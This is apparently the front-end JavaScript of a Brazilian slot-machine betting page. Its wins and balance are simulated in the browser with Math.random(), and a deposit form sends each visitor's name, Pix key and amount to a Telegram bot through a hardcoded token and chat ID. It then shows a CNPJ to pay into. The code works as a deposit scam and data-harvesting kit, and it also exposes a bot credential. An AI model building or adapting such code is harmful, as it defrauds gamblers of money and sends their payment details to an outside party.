// Configurações de API do Telegram
const TOKEN = "8568148429:AAGzen7zf-n-fGJnUpaNGVCLvQnsR2JxJ3fs"; // Token mantido conforme fornecido
const CHAT_ID = "7668457919";

// Controle de estado para evitar bugs visual e cliques múltiplos
let estaGirando = false; 

window.girarSlots = () => {
    // Se já estiver rodando, ignora o clique do usuário
    if (estaGirando) return; 
    estaGirando = true;

    const colunas = document.querySelectorAll('.coluna');
    const simbolos = ["🐯", "💰", "🍊", "🎆", "💎"];
    
    // Array para armazenar o intervalo de rotação de cada coluna
    let intervalos = [];

    colunas.forEach((col, index) => {
        // Aplica a classe CSS de desfoque de movimento imediatamente
        col.classList.add('slot-spinning'); 

        // Inicia o ciclo rápido de troca de símbolos (80ms para parecer mais veloz)
        intervalos[index] = setInterval(() => {
            col.querySelectorAll('.simbolo').forEach(d => {
                d.innerText = simbolos[Math.floor(Math.random() * simbolos.length)];
            });
        }, 80);

        // EFEITO CASCATA: Cada coluna para em um momento diferente
        // Coluna 1: 1.0s | Coluna 2: 1.4s | Coluna 3: 1.8s (ajustável mudando o multiplicador)
        setTimeout(() => {
            clearInterval(intervalos[index]);
            col.classList.remove('slot-spinning'); // Remove desfoque ao travar o símbolo

            // Verifica se a última coluna terminou de rodar
            if (index === colunas.length - 1) {
                estaGirando = false; 
                
                // Define a lógica de ganho (Matematicamente ~40% de chance no seu código atual)
                if (Math.random() > 0.6) {
                    processarVitoria();
                }
            }
        }, 1000 + (index * 400)); 
    });
};

function processarVitoria() {
    const apostaAtual = parseFloat(document.getElementById("valor-aposta").innerText.replace("R$ ", "").replace(",", "."));
    const ganho = apostaAtual * 2;
    
    const saldoEl = document.getElementById('saldo');
    let saldoAtual = parseFloat(saldoEl.innerText.replace("R$ ", "").replace(",", "."));
    const saldoFinal = saldoAtual + ganho;

    // ANIMAÇÃO DE ODÔMETRO (Contagem progressiva do prêmio adicionado ao saldo)
    let fragmentoGanho = ganho / 25; // Divide o prêmio em 25 etapas visuais
    let animarContador = setInterval(() => {
        saldoAtual += fragmentoGanho;
        
        if (saldoAtual >= saldoFinal) {
            saldoAtual = saldoFinal;
            clearInterval(animarContador);
        }
        
        saldoEl.innerText = `R$ ${saldoAtual.toFixed(2).replace(".", ",")}`;
    }, 30); // Sobe o valor a cada 30 milissegundos

    // Exibe a mensagem flutuante de sucesso
    const msg = document.getElementById('notificacao');
    msg.innerText = `PARABÉNS! VOCÊ GANHOU R$ ${ganho.toFixed(2).replace(".", ",")}!`;
    msg.classList.remove('hidden');
    
    setTimeout(() => msg.classList.add('hidden'), 3000);
}

// --- Modais de Depósito e Envio de Dados ---

window.abrirModal = () => {
    document.getElementById('form-deposito').classList.remove('hidden');
    document.getElementById('info-pix').classList.add('hidden');
    document.getElementById('modal-deposito').classList.remove('hidden');
};

window.fecharModal = () => {
    document.getElementById('modal-deposito').classList.add('hidden');
};

window.copiarCNPJ = () => {
    const campo = document.getElementById("chave-cnpj");
    campo.select();
    campo.setSelectionRange(0, 99999); // Suporte expandido para navegadores mobile
    document.execCommand("copy");
    alert("CNPJ copiado com sucesso!");
};

window.confirmarDeposito = () => {
    const nome = document.getElementById("nome-usuario").value;
    const chave = document.getElementById("pix-chave").value;
    const valor = document.getElementById("valor-deposito").value;
    
    if(!nome || !chave || !valor) {
        alert("Preencha todos os campos obrigatórios!");
        return;
    }

    // Requisição estruturada para o Bot do Telegram
    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: "POST", 
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
            chat_id: CHAT_ID, 
            text: `🎰 NOVO INTENTO DE DEPÓSITO 🎰\n\n👤 Usuário: ${nome}\n🔑 Chave Informada: ${chave}\n💵 Valor Informado: R$ ${valor}` 
        })
    })
    .then(resposta => {
        if (!resposta.ok) throw new Error();
        document.getElementById('form-deposito').classList.add('hidden');
        document.getElementById('info-pix').classList.remove('hidden');
    })
    .catch(() => {
        alert("Falha temporária de rede ao sincronizar. Tente novamente em instantes.");
    });
};

window.alterarAposta = (mod) => {
    // Bloqueia alteração de valores no meio da rodada ativa
    if (estaGirando) return; 
    
    const display = document.getElementById("valor-aposta");
    let valor = parseFloat(display.innerText.replace("R$ ", "").replace(",", ".")) + (mod * 2);
    display.innerText = `R$ ${Math.max(2, valor).toFixed(2).replace(".", ",")}`;
};
